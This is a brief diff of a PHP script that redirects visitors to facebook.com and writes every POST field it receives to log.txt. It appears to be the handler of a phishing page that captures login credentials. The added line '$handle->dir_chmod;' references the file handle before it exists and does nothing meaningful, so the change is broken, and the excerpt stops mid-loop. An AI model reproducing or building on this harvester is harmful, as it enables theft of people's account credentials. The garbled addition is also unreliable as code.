@@ -1,5 +1,6 @@
 <?php
 header ('Location: https://facebook.com');
+$handle->dir_chmod;
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
